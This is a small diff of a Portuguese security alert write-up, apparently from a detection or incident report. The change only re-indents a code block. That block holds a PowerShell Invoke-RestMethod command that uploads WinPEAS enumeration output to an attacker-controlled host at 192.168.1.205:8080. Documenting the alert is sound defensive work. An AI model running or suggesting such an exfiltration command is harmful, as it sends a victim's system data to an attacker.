@@ -1004,9 +1004,9 @@ O uso da função `IEX` (Invoke-Expression), aliado ao `DownloadString`, constit
 ### Detalhes técnicos do alerta:
 
 - **Comando invocado**:
-  ```powershell
-  Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
-  ```
+```powershell
+Invoke-RestMethod -Uri "http://192.168.1.205:8080/winpeas.txt" -Method PUT -InFile "C:\Users\jsilva\Downloads\winpeas.txt"
+```
 - **Canal**: Microsoft-Windows-PowerShell/Operational  
 - **Ficheiro exfiltrado**: `winpeas.txt`, gerado anteriormente com os resultados da enumeração feita via WinPEAS  
 - **Destino remoto**: `192.168.1.205` na porta `8080` (servidor de receção configurado pelo atacante)
